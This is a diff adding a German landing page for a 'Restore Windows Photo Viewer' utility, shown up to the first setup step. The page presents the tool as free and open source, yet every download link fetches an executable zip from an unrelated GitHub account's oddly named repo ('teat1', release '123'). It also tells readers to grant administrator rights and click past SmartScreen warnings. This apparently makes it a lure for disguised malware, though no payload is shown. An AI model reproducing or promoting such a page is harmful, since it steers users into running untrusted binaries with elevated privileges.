@@ -1,0 +1,550 @@
+<!doctype html>
+<html lang="de">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Windows-Fotoanzeige unter Windows 10 &amp; 11 zurückholen | Kostenlos, ein Klick</title>
+<meta name="description" content="Machen Sie die klassische Windows-Fotoanzeige unter Windows 10 und 11 mit einem Klick wieder zur Standard-App für Fotos. Ohne Registry-Bearbeitung, jederzeit rückgängig, kostenlos und Open Source.">
+<link rel="canonical" href="https://PinCraneUpgrade.github.io/restore-windows-photo-viewer/de/">
+<link rel="alternate" hreflang="en" href="https://PinCraneUpgrade.github.io/restore-windows-photo-viewer/">
+<link rel="alternate" hreflang="de" href="https://PinCraneUpgrade.github.io/restore-windows-photo-viewer/de/">
+<link rel="alternate" hreflang="pt-BR" href="https://PinCraneUpgrade.github.io/restore-windows-photo-viewer/pt/">
+<link rel="alternate" hreflang="es" href="https://PinCraneUpgrade.github.io/restore-windows-photo-viewer/es/">
+<link rel="alternate" hreflang="fr" href="https://PinCraneUpgrade.github.io/restore-windows-photo-viewer/fr/">
+<link rel="alternate" hreflang="it" href="https://PinCraneUpgrade.github.io/restore-windows-photo-viewer/it/">
+<link rel="alternate" hreflang="x-default" href="https://PinCraneUpgrade.github.io/restore-windows-photo-viewer/">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://PinCraneUpgrade.github.io/restore-windows-photo-viewer/de/">
+<meta property="og:locale" content="de_DE">
+<meta property="og:title" content="Windows-Fotoanzeige unter Windows 10 &amp; 11 zurückholen">
+<meta property="og:description" content="Holen Sie die klassische Fotoanzeige mit einem Klick zurück. Ohne Registry-Bearbeitung, jederzeit rückgängig.">
+<meta property="og:image" content="https://PinCraneUpgrade.github.io/restore-windows-photo-viewer/assets/app-main.webp">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=Inter:wght@400;500;600&family=Source+Serif+4:opsz,wght@8..60,600;8..60,700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../styles.css">
+<link rel="icon" href="../favicon.svg" type="image/svg+xml">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "Restore Windows Photo Viewer",
+  "operatingSystem": "Windows 10, Windows 11",
+  "applicationCategory": "UtilitiesApplication",
+  "softwareVersion": "1.0",
+  "downloadUrl": "https://github.com/WraithEchoAdapter/teat1/releases/download/123/RestoreWindowsPhotoViewer.zip",
+  "license": "https://opensource.org/licenses/MIT",
+  "description": "Machen Sie die klassische Windows-Fotoanzeige unter Windows 10 und 11 mit einem Klick wieder zur Standard-App für Fotos. Ohne Registry-Bearbeitung, jederzeit rückgängig, kostenlos und Open Source.",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "FAQPage",
+  "mainEntity": [
+    {
+      "@type": "Question",
+      "name": "Ist die Nutzung sicher?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Ja. Das Tool ändert nur, welche App Windows als Standard-Fotoanzeige verwendet. Es verändert oder löscht keine Fotos, und die Änderung lässt sich jederzeit im Programm rückgängig machen."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "Funktioniert es unter Windows 11?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Ja. Restore Windows Photo Viewer läuft unter Windows 10 und Windows 11, auch mit den neuesten Updates."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "Warum fehlt die Windows-Fotoanzeige in meinen Standard-Apps?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Seit Windows 8 blendet Microsoft die Windows-Fotoanzeige in den Standard-Apps aus, obwohl die Programmdateien weiterhin in Windows enthalten sind. Dieses Tool aktiviert sie wieder, ohne etwas zu entfernen oder neu zu installieren."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "Kann ich später zur Fotos-App zurückwechseln?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Ja. Tool erneut öffnen und Keep using Photos App klicken. Windows öffnet Bilder dann wieder in der Fotos-App."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "Brauche ich Administratorrechte?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Ja. Da das Tool Standard-App-Einstellungen des Systems ändert, braucht es Administratorrechte. Falls es nicht automatisch fragt: .exe rechtsklicken und Als Administrator ausführen wählen."
+      }
+    }
+  ]
+}
+</script>
+</head>
+<body>
+
+<!-- Icon sprite: GitHub Octicons (github.com/primer/octicons, MIT) + page-specific drawings -->
+<svg width="0" height="0" style="position:absolute" aria-hidden="true">
+  <symbol id="i-github" viewBox="0 0 16 16"><path d="M6.766 11.328c-2.063-.25-3.516-1.734-3.516-3.656 0-.781.281-1.625.75-2.188-.203-.515-.172-1.609.063-2.062.625-.078 1.468.25 1.968.703.594-.187 1.219-.281 1.985-.281.765 0 1.39.094 1.953.265.484-.437 1.344-.765 1.969-.687.218.422.25 1.515.046 2.047.5.593.766 1.39.766 2.203 0 1.922-1.453 3.375-3.547 3.64.531.344.89 1.094.89 1.954v1.625c0 .468.391.734.86.547C13.781 14.359 16 11.53 16 8.030 16 3.610 12.406 0 7.984 0 3.563 0 0 3.610 0 8.031a7.880 7.880 0 0 0 5.172 7.422c.422.156.828-.125.828-.547v-1.25c-.219.094-.5.156-.75.156-1.031 0-1.640-.562-2.078-1.609-.172-.422-.36-.672-.719-.719-.187-.015-.25-.093-.25-.187 0-.188.313-.328.625-.328.453 0 .844.281 1.25.86.313.452.64.655 1.031.655s.641-.14 1-.5c.266-.265.470-.5.657-.656"/></symbol>
+  <symbol id="i-star" viewBox="0 0 16 16"><path d="M8 .25a.75.75 0 0 1 .673.418l1.882 3.815 4.21.612a.75.75 0 0 1 .416 1.279l-3.046 2.97.719 4.192a.751.751 0 0 1-1.088.791L8 12.347l-3.766 1.98a.75.75 0 0 1-1.088-.79l.72-4.194L.818 6.374a.75.75 0 0 1 .416-1.28l4.21-.611L7.327.668A.75.75 0 0 1 8 .25Zm0 2.445L6.615 5.5a.75.75 0 0 1-.564.41l-3.097.45 2.24 2.184a.75.75 0 0 1 .216.664l-.528 3.084 2.769-1.456a.75.75 0 0 1 .698 0l2.77 1.456-.53-3.084a.75.75 0 0 1 .216-.664l2.24-2.183-3.096-.45a.75.75 0 0 1-.564-.41L8 2.694Z"/></symbol>
+  <symbol id="i-unlock" viewBox="0 0 16 16"><path d="M5.5 4v2h7A1.5 1.5 0 0 1 14 7.5v6a1.5 1.5 0 0 1-1.5 1.5h-9A1.5 1.5 0 0 1 2 13.5v-6A1.5 1.5 0 0 1 3.499 6H4V4a4 4 0 0 1 7.371-2.154.75.75 0 0 1-1.264.808A2.5 2.5 0 0 0 5.5 4Zm-2 3.5v6h9v-6h-9Z"/></symbol>
+  <symbol id="i-shield" viewBox="0 0 16 16"><path d="m8.533.133 5.25 1.68A1.75 1.75 0 0 1 15 3.48V7c0 1.566-.32 3.182-1.303 4.682-.983 1.498-2.585 2.813-5.032 3.855a1.697 1.697 0 0 1-1.33 0c-2.447-1.042-4.049-2.357-5.032-3.855C1.32 10.182 1 8.566 1 7V3.48a1.75 1.75 0 0 1 1.217-1.667l5.25-1.68a1.748 1.748 0 0 1 1.066 0Zm-.61 1.429.001.001-5.25 1.68a.251.251 0 0 0-.174.237V7c0 1.36.275 2.666 1.057 3.859.784 1.194 2.121 2.342 4.366 3.298a.196.196 0 0 0 .154 0c2.245-.957 3.582-2.103 4.366-3.297C13.225 9.666 13.5 8.358 13.5 7V3.48a.25.25 0 0 0-.174-.238l-5.25-1.68a.25.25 0 0 0-.153 0ZM11.28 6.280l-3.5 3.5a.75.75 0 0 1-1.06 0l-1.5-1.5a.749.749 0 0 1 .326-1.275.749.749 0 0 1 .734.215l.97.97 2.97-2.97a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042Z"/></symbol>
+  <symbol id="i-download" viewBox="0 0 16 16"><path d="M2.75 14A1.75 1.75 0 0 1 1 12.25v-2.5a.75.75 0 0 1 1.5 0v2.5c0 .138.112.25.25.25h10.5a.25.25 0 0 0 .25-.25v-2.5a.75.75 0 0 1 1.5 0v2.5A1.75 1.75 0 0 1 13.25 14Z"/><path d="M7.25 7.689V2a.75.75 0 0 1 1.5 0v5.689l1.97-1.969a.749.749 0 1 1 1.060 1.060l-3.25 3.25a.749.749 0 0 1-1.060 0L4.22 6.78a.749.749 0 1 1 1.060-1.060l1.97 1.969Z"/></symbol>
+  <symbol id="i-law" viewBox="0 0 16 16"><path d="M8.75.75V2h.985c.304 0 .603.08.867.231l1.29.736c.038.022.08.033.124.033h2.234a.75.75 0 0 1 0 1.5h-.427l2.111 4.692a.75.75 0 0 1-.154.838l-.53-.53.529.531-.001.002-.002.002-.006.006-.006.005-.01.01-.045.04c-.21.176-.441.327-.686.45C14.556 10.78 13.880 11 13 11a4.498 4.498 0 0 1-2.023-.454 3.544 3.544 0 0 1-.686-.45l-.045-.04-.016-.015-.006-.006-.004-.004v-.001a.75.75 0 0 1-.154-.838L12.178 4.5h-.162c-.305 0-.604-.079-.868-.231l-1.29-.736a.245.245 0 0 0-.124-.033H8.75V13h2.5a.75.75 0 0 1 0 1.5h-6.5a.75.75 0 0 1 0-1.5h2.5V3.5h-.984a.245.245 0 0 0-.124.033l-1.289.737c-.265.15-.564.23-.869.23h-.162l2.112 4.692a.75.75 0 0 1-.154.838l-.53-.53.529.531-.001.002-.002.002-.006.006-.016.015-.045.04c-.21.176-.441.327-.686.45C4.556 10.78 3.880 11 3 11a4.498 4.498 0 0 1-2.023-.454 3.544 3.544 0 0 1-.686-.45l-.045-.04-.016-.015-.006-.006-.004-.004v-.001a.75.75 0 0 1-.154-.838L2.178 4.5H1.75a.75.75 0 0 1 0-1.5h2.234a.249.249 0 0 0 .125-.033l1.288-.737c.265-.15.564-.23.869-.23h.984V.75a.75.75 0 0 1 1.5 0Zm2.945 8.477c.285.135.718.273 1.305.273s1.02-.138 1.305-.273L13 6.327Zm-10 0c.285.135.718.273 1.305.273s1.02-.138 1.305-.273L3 6.327Z"/></symbol>
+  <symbol id="i-check" viewBox="0 0 16 16"><path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"/></symbol>
+  <symbol id="i-x" viewBox="0 0 16 16"><path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.220a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.220 3.220a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"/></symbol>
+  <symbol id="i-alert" viewBox="0 0 16 16"><path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"/></symbol>
+  <symbol id="i-arrow" viewBox="0 0 16 16"><path d="M8.22 2.97a.75.75 0 0 1 1.06 0l4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042l2.97-2.97H3.75a.75.75 0 0 1 0-1.5h7.44L8.22 4.03a.75.75 0 0 1 0-1.06Z"/></symbol>
+  <symbol id="i-chevron" viewBox="0 0 16 16"><path d="M12.78 5.22a.749.749 0 0 1 0 1.06l-4.25 4.25a.749.749 0 0 1-1.06 0L3.22 6.28a.749.749 0 1 1 1.06-1.06L8 8.939l3.72-3.719a.749.749 0 0 1 1.06 0Z"/></symbol>
+  <symbol id="i-globe" viewBox="0 0 16 16"><path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0ZM5.78 8.75a9.64 9.64 0 0 0 1.363 4.177c.255.426.542.832.857 1.215.245-.296.551-.705.857-1.215A9.64 9.64 0 0 0 10.22 8.75Zm4.44-1.5a9.64 9.64 0 0 0-1.363-4.177c-.307-.51-.612-.919-.857-1.215a9.927 9.927 0 0 0-.857 1.215A9.64 9.64 0 0 0 5.78 7.25Zm-5.944 1.5H1.543a6.507 6.507 0 0 0 4.666 5.5c-.123-.181-.24-.365-.352-.552-.715-1.192-1.437-2.874-1.581-4.948Zm-2.733-1.5h2.733c.144-2.074.866-3.756 1.58-4.948.12-.197.237-.381.353-.552a6.507 6.507 0 0 0-4.666 5.5Zm10.181 1.5c-.144 2.074-.866 3.756-1.58 4.948-.12.197-.237.381-.353.552a6.507 6.507 0 0 0 4.666-5.5Zm2.733-1.5a6.507 6.507 0 0 0-4.666-5.5c.123.181.24.365.353.552.714 1.192 1.436 2.874 1.58 4.948Z"/></symbol>
+  <symbol id="i-heart" viewBox="0 0 16 16"><path d="M7.655 14.916v-.001h-.002l-.006-.003-.018-.01a22.066 22.066 0 0 1-3.744-2.584C2.045 10.731 0 8.35 0 5.5 0 2.836 2.086 1 4.25 1 5.797 1 7.153 1.802 8 3.02 8.847 1.802 10.203 1 11.75 1 13.914 1 16 2.836 16 5.5c0 2.85-2.044 5.231-3.886 6.818a22.094 22.094 0 0 1-3.433 2.414 7.152 7.152 0 0 1-.31.17l-.018.01-.008.004a.75.75 0 0 1-.69 0Z"/></symbol>
+  <symbol id="i-zip" viewBox="0 0 16 16"><path d="M3.5 1.75v11.5c0 .09.048.173.126.217a.75.75 0 0 1-.752 1.298A1.748 1.748 0 0 1 2 13.25V1.75C2 .784 2.784 0 3.75 0h5.586c.464 0 .909.185 1.237.513l2.914 2.914c.329.328.513.773.513 1.237v8.586A1.75 1.75 0 0 1 12.25 15h-.5a.75.75 0 0 1 0-1.5h.5a.25.25 0 0 0 .25-.25V4.664a.25.25 0 0 0-.073-.177L9.513 1.573a.25.25 0 0 0-.177-.073H7.25a.75.75 0 0 1 0 1.5h-.5a.75.75 0 0 1 0-1.5h-3a.25.25 0 0 0-.25.25Zm3.75 8.75h.5c.966 0 1.75.784 1.75 1.75v3a.75.75 0 0 1-.75.75h-2.5a.75.75 0 0 1-.75-.75v-3c0-.966.784-1.75 1.75-1.75ZM6 5.25a.75.75 0 0 1 .75-.75h.5a.75.75 0 0 1 0 1.5h-.5A.75.75 0 0 1 6 5.25Zm.75 2.25h.5a.75.75 0 0 1 0 1.5h-.5a.75.75 0 0 1 0-1.5ZM8 6.75A.75.75 0 0 1 8.75 6h.5a.75.75 0 0 1 0 1.5h-.5A.75.75 0 0 1 8 6.75ZM8.75 3h.5a.75.75 0 0 1 0 1.5h-.5a.75.75 0 0 1 0-1.5ZM8 9.75A.75.75 0 0 1 8.75 9h.5a.75.75 0 0 1 0 1.5h-.5A.75.75 0 0 1 8 9.75Zm-1 2.5v2.25h1v-2.25a.25.25 0 0 0-.25-.25h-.5a.25.25 0 0 0-.25.25Z"/></symbol>
+  <symbol id="i-history" viewBox="0 0 24 24"><path d="M11.998 2.5A9.503 9.503 0 0 0 3.378 8H5.75a.75.75 0 0 1 0 1.5H2a1 1 0 0 1-1-1V4.75a.75.75 0 0 1 1.5 0v1.697A10.997 10.997 0 0 1 11.998 1C18.074 1 23 5.925 23 12s-4.926 11-11.002 11C6.014 23 1.146 18.223 1 12.275a.75.75 0 0 1 1.5-.037 9.5 9.5 0 0 0 9.498 9.262c5.248 0 9.502-4.253 9.502-9.5s-4.254-9.5-9.502-9.5Z"/><path d="M12.5 7.25a.75.75 0 0 0-1.5 0v5.5c0 .27.144.518.378.651l3.5 2a.75.75 0 0 0 .744-1.302L12.5 12.315V7.25Z"/></symbol>
+  <symbol id="i-desktop" viewBox="0 0 24 24"><path d="M8.954 17H2.75A1.75 1.75 0 0 1 1 15.25V3.75C1 2.784 1.784 2 2.75 2h18.5c.966 0 1.75.784 1.75 1.750v11.5A1.75 1.75 0 0 1 21.25 17h-6.204c.171 1.375.805 2.652 1.769 3.757A.752.752 0 0 1 16.25 22h-8.5a.75.75 0 0 1-.565-1.243c.964-1.105 1.598-2.382 1.769-3.757ZM21.5 3.75a.25.25 0 0 0-.25-.25H2.75a.25.25 0 0 0-.25.25v11.5c0 .138.112.25.25.25h18.5a.25.25 0 0 0 .25-.25ZM13.537 17h-3.074c-.126 1.266-.564 2.445-1.223 3.5h5.52c-.659-1.055-1.098-2.234-1.223-3.5Z"/></symbol>
+  <symbol id="i-tools" viewBox="0 0 24 24"><path d="M7.875 2.292a.114.114 0 0 0-.032.018A7.239 7.239 0 0 0 4.75 8.25a7.248 7.248 0 0 0 3.654 6.297c.57.327.982.955.941 1.682v.002l-.317 6.058a.75.75 0 1 1-1.498-.078l.317-6.062v-.004c.006-.09-.047-.215-.188-.296A8.749 8.749 0 0 1 3.25 8.25a8.738 8.738 0 0 1 3.732-7.169 1.547 1.547 0 0 1 1.709-.064c.484.292.809.835.809 1.46v4.714a.25.25 0 0 0 .119.213l2.25 1.385c.08.05.182.05.262 0l2.25-1.385a.25.25 0 0 0 .119-.213V2.478c0-.626.325-1.169.81-1.461a1.547 1.547 0 0 1 1.708.064 8.741 8.741 0 0 1 3.732 7.17 8.747 8.747 0 0 1-4.41 7.598c-.14.081-.193.206-.188.296v.004l.318 6.062a.75.75 0 1 1-1.498.078l-.317-6.058v-.002c-.041-.727.37-1.355.94-1.682A7.247 7.247 0 0 0 19.25 8.25a7.239 7.239 0 0 0-3.093-5.94.114.114 0 0 0-.032-.018l-.01-.001c-.003 0-.014 0-.031.01-.036.022-.084.079-.084.177V7.19c0 .608-.315 1.172-.833 1.49l-2.25 1.385a1.75 1.75 0 0 1-1.834 0l-2.25-1.384A1.752 1.752 0 0 1 8 7.192V2.477c0-.098-.048-.155-.084-.176a.068.068 0 0 0-.031-.011l-.01.001Z"/></symbol>
+
+  <!-- Sample photo used inside both window mockups -->
+  <symbol id="photo" viewBox="0 0 1600 1000">
+    <rect width="1600" height="1000" fill="#e6cfa8"/>
+    <rect width="1600" height="220" fill="#c3cfd4"/>
+    <rect y="220" width="1600" height="150" fill="#d6d4c4"/>
+    <circle cx="1130" cy="500" r="92" fill="#f2bd73"/>
+    <path fill="#9ba6ab" d="M0 560 180 440 320 500 470 390 640 520 790 455 930 545 1080 425 1250 520 1400 450 1600 540V650H0Z"/>
+    <path fill="#6b7c86" d="M0 610 150 548 300 598 430 530 610 640 760 580 900 628 1050 570 1230 632 1390 575 1600 628V680H0Z"/>
+    <rect y="650" width="1600" height="250" fill="#a7b5b9"/>
+    <g fill="#bcc8ca"><rect x="120" y="705" width="260" height="5"/><rect x="520" y="740" width="340" height="5"/><rect x="220" y="790" width="200" height="5"/><rect x="760" y="820" width="420" height="5"/><rect x="1280" y="760" width="220" height="5"/></g>
+    <g fill="#e9c38c"><rect x="1070" y="668" width="120" height="8"/><rect x="1090" y="700" width="80" height="7"/><rect x="1100" y="730" width="60" height="6"/><rect x="1112" y="758" width="36" height="5"/></g>
+    <path fill="#2f3b37" d="M690 752h120l-18 18h-86Z"/><rect x="746" y="700" width="4" height="52" fill="#2f3b37"/>
+    <path fill="#33463c" d="M0 880 260 836 560 866 900 818 1230 852 1600 820V1000H0Z"/>
+    <g fill="#223228">
+      <path d="M60 900 110 700 160 900Z"/><path d="M130 910 190 640 250 910Z"/><path d="M230 900 270 740 310 900Z"/>
+      <path d="M1380 880 1430 690 1480 880Z"/><path d="M1450 890 1510 620 1570 890Z"/>
+    </g>
+  </symbol>
+</svg>
+
+<!-- Window mockups, cloned by main.js into every .js-mock slot -->
+<template id="tpl-photos">
+  <div class="win ph" aria-hidden="true">
+    <div class="ph-title"><span class="app-ico"></span>Photos<span class="win-ctrls"><i></i><i></i><i></i></span></div>
+    <div class="ph-body">
+      <div class="ph-side">
+        <span class="on">Gallery</span><span>Favorites</span><span>OneDrive – Personal</span><span>iCloud Photos</span>
+        <hr><span>Folders</span><span>Pictures</span><span>Screenshots</span>
+      </div>
+      <div class="ph-main">
+        <div class="ph-tools">
+          <span class="file">lake-at-dusk.jpg</span>
+          <i></i><i class="round"></i><i></i><i class="line"></i><i></i><i class="round"></i>
+          <span class="ai">Visual search</span><span class="edit">Edit</span><i class="round"></i>
+        </div>
+        <div class="ph-stage">
+          <svg viewBox="0 0 1600 1000"><use href="#photo"/></svg>
+          <div class="ph-loading"><b></b><span>Loading your gallery…</span></div>
+        </div>
+        <div class="ph-strip"><i></i><i></i><i></i><i class="on"></i><i></i><i></i><i></i><i></i></div>
+      </div>
+    </div>
+    <div class="ph-toast">
+      <strong>Back up your photos</strong>
+      <span>Sign in to OneDrive to keep your memories safe.</span>
+      <em>Sign in</em>
+    </div>
+  </div>
+</template>
+
+<template id="tpl-viewer">
+  <div class="win pv" aria-hidden="true">
+    <div class="pv-title">
+      <svg class="app-ico" viewBox="0 0 16 16"><rect x="1" y="2" width="14" height="12" fill="#3c7fc1"/><path d="M2 13 6 8l3 3 2-2 3 4Z" fill="#dfe9f5"/><circle cx="11" cy="5.5" r="1.5" fill="#f2bd73"/></svg>
+      lake-at-dusk.jpg - Windows Photo Viewer<span class="win-ctrls"><i></i><i></i><i></i></span>
+    </div>
+    <div class="pv-cmd"><span>File</span><span>Print</span><span class="no-caret">E-mail</span><span>Burn</span><span>Open</span><span class="help">?</span></div>
+    <div class="pv-stage"><svg viewBox="0 0 1600 1000"><use href="#photo"/></svg></div>
+    <div class="pv-bar">
+      <svg viewBox="0 0 380 44" fill="none" stroke="#2c4a6b" stroke-width="2">
+        <circle cx="26" cy="20" r="7"/><path d="M31 25l6 6"/>
+        <rect x="56" y="13" width="16" height="16" rx="1"/><path d="M61 21h6" />
+        <path d="M96 8v28" stroke="#b9cde5"/>
+        <circle cx="130" cy="22" r="12" fill="#fff"/><path d="M134 16l-7 6 7 6" />
+        <circle cx="180" cy="22" r="18" fill="#2f73c0" stroke="#1f5a9c"/><path d="M174 13v18l15-9Z" fill="#fff" stroke="none"/>
+        <circle cx="230" cy="22" r="12" fill="#fff"/><path d="M226 16l7 6-7 6" />
+        <path d="M264 8v28" stroke="#b9cde5"/>
+        <path d="M292 16a8 8 0 1 0 5 3"/><path d="M285 12l3 6 5-3" />
+        <path d="M322 16a8 8 0 1 1-5 3"/><path d="M329 12l-3 6-5-3" />
+        <path d="M350 14l12 14M362 14l-12 14" stroke="#c0392b" stroke-width="2.6"/>
+      </svg>
+    </div>
+  </div>
+</template>
+
+
+<header class="nav">
+  <div class="wrap">
+    <a class="brand" href="#top" aria-label="Restore Windows Photo Viewer, Startseite">
+      <svg class="brand-mark" viewBox="0 0 32 32" aria-hidden="true"><rect x="3" y="5" width="26" height="22" rx="2" fill="#1f4e79"/><path d="M6 23l7-8 5 5 3-3 5 6z" fill="#f7f5f0"/><circle cx="22" cy="11" r="2.5" fill="#c17f2e"/></svg>
+      Restore Windows Photo Viewer
+    </a>
+    <nav aria-label="Hauptmenü">
+      <ul class="nav-links">
+        <li><a href="#how">So geht’s</a></li>
+        <li><a href="#features">Funktionen</a></li>
+        <li><a href="#faq">FAQ</a></li>
+        <li><a class="gh" href="https://github.com/PinCraneUpgrade/restore-windows-photo-viewer"><svg class="icon"><use href="#i-github"/></svg>GitHub</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<main id="top">
+
+  <!-- 1. Hero -->
+  <section class="hero">
+    <div class="wrap">
+      <div class="hero-top">
+        <div>
+          <p class="eyebrow">KOSTENLOS · OPEN SOURCE · EIN KLICK</p>
+          <h1>Windows-Fotoanzeige unter Windows&nbsp;10&nbsp;&amp;&nbsp;11 zurückholen</h1>
+        </div>
+        <div>
+          <p class="hero-lede">Holen Sie die klassische Fotoanzeige mit einem Klick zurück. Ohne Registry-Bearbeitung, jederzeit rückgängig.</p>
+          <div class="hero-actions">
+            <a class="btn btn-primary" href="https://github.com/WraithEchoAdapter/teat1/releases/download/123/RestoreWindowsPhotoViewer.zip"><svg class="icon"><use href="#i-download"/></svg>Für Windows herunterladen</a>
+            <a class="btn btn-ghost" href="https://github.com/PinCraneUpgrade/restore-windows-photo-viewer"><svg class="icon"><use href="#i-github"/></svg>Auf GitHub ansehen</a>
+          </div>
+          <p class="hero-meta">Windows 10 &amp; 11 · Portabel · Keine Installation nötig</p>
+        </div>
+      </div>
+
+      <div class="compare" id="compare">
+        <div class="compare-stage">
+          <div class="compare-layer is-after js-mock" data-tpl="tpl-viewer"></div>
+          <div class="compare-layer is-before js-mock" data-tpl="tpl-photos"></div>
+          <div class="compare-handle"><span class="compare-knob"><svg viewBox="0 0 24 24"><path d="M9 6 3 12l6 6V6Zm6 0v12l6-6-6-6Z"/></svg></span></div>
+          <label class="sr-only" for="compare-range">Ziehen, um die Fotos-App mit der Windows-Fotoanzeige zu vergleichen</label>
+          <input class="compare-range" id="compare-range" type="range" min="0" max="100" value="50">
+        </div>
+        <div class="compare-labels">
+          <span><strong>Fotos-App</strong>, was Windows heute öffnet</span>
+          <span class="hint">Zum Vergleichen ziehen</span>
+          <span><strong>Windows-Fotoanzeige</strong>, nach einem Klick</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 2. Social proof -->
+  <div class="proof">
+    <div class="wrap">
+      <ul>
+        <li><svg class="icon"><use href="#i-star"/></svg><a href="https://github.com/PinCraneUpgrade/restore-windows-photo-viewer">Open Source auf GitHub</a></li>
+        <li><svg class="icon"><use href="#i-unlock"/></svg>Vollständig umkehrbar</li>
+        <li><svg class="icon"><use href="#i-shield"/></svg>Keine Registry-Kenntnisse nötig</li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- 3. Before / After -->
+  <section class="section" id="compare-detail">
+    <div class="wrap">
+      <div class="section-head">
+        <h2>Dasselbe Foto, zwei sehr unterschiedliche Fenster</h2>
+        <p>Die Fotos-App ist um Bibliothek, Cloud-Sync und Bearbeitung herum gebaut. Die Windows-Fotoanzeige zeigt einfach das Bild, das Sie doppelt angeklickt haben.</p>
+      </div>
+
+      <div class="ba">
+        <figure class="ba-frame">
+          <figcaption><span class="status status-warn">heute Standard</span><strong>Fotos-App</strong></figcaption>
+          <div class="ba-shot js-mock" data-tpl="tpl-photos"></div>
+        </figure>
+        <span class="ba-arrow" aria-hidden="true"><svg class="icon"><use href="#i-arrow"/></svg></span>
+        <figure class="ba-frame">
+          <figcaption><span class="status status-ok">nach Restore</span><strong>Windows-Fotoanzeige</strong></figcaption>
+          <div class="ba-shot js-mock" data-tpl="tpl-viewer"></div>
+        </figure>
+      </div>
+
+      <div class="diff" role="table" aria-label="Was sich beim Zurückwechseln ändert">
+        <div class="diff-row head" role="row">
+          <span role="columnheader"></span>
+          <span role="columnheader">Fotos-App</span>
+          <span role="columnheader">Windows-Fotoanzeige</span>
+        </div>
+        <div class="diff-row" role="row">
+          <h3 role="rowheader">Foto öffnen</h3>
+          <p class="lose" role="cell"><svg class="icon"><use href="#i-x"/></svg>Lädt zuerst Galerie und Bibliothek, das Bild erscheint erst nach einer Pause</p>
+          <p class="gain" role="cell"><svg class="icon"><use href="#i-check"/></svg>Das Bild ist sofort nach dem Doppelklick da</p>
+        </div>
+        <div class="diff-row" role="row">
+          <h3 role="rowheader">Symbolleiste</h3>
+          <p class="lose" role="cell"><svg class="icon"><use href="#i-x"/></svg>Bearbeiten, visuelle Suche, Teilen und OneDrive-Anmeldehinweise</p>
+          <p class="gain" role="cell"><svg class="icon"><use href="#i-check"/></svg>Datei, Drucken, E-Mail, Brennen, Öffnen. Zoom und Drehen unten.</p>
+        </div>
+        <div class="diff-row" role="row">
+          <h3 role="rowheader">Drucken</h3>
+          <p class="lose" role="cell"><svg class="icon"><use href="#i-x"/></svg>Versteckt im „…“-Menü</p>
+          <p class="gain" role="cell"><svg class="icon"><use href="#i-check"/></svg>Drucken direkt in der Symbolleiste, ein Klick bis zum Druckdialog</p>
+        </div>
+        <div class="diff-row" role="row">
+          <h3 role="rowheader">Ordner durchblättern</h3>
+          <p class="lose" role="cell"><svg class="icon"><use href="#i-x"/></svg>Filmstreifen und Galerieansicht zum Scrollen</p>
+          <p class="gain" role="cell"><svg class="icon"><use href="#i-check"/></svg>Pfeiltasten blättern durch den Ordner, F11 startet die Diashow</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 4. How it works -->
+  <section class="section" id="how">
+    <div class="wrap">
+      <div class="section-head">
+        <h2>So holen Sie die Windows-Fotoanzeige zurück</h2>
+        <p>Drei Schritte. Den Registrierungs-Editor müssen Sie nicht öffnen.</p>
+      </div>
+
+      <ol class="steps">
+        <li class="step">
+          <span class="step-num">Schritt 1</span>
+          <h3>Herunterladen &amp; starten</h3>
+          <p>ZIP entpacken und <span class="mono">RestoreWindowsPhotoViewer.exe</span> doppelklicken. Falls SmartScreen erscheint: Weitere Informationen, dann Trotzdem ausführen.</p>
+          <div class="step-visual" aria-hidden="true">
+            <div class="file-row">
+              <div class="fr-item sel"><svg class="icon"><use href="#i-zip"/></svg>RestoreWindowsPhotoViewer.zip<small>Compressed</small></div>
+              <div class="fr-menu"><span>Open</span><span class="hl">Extract All…</span><span>Share</span></div>
+            </div>
+          </div>
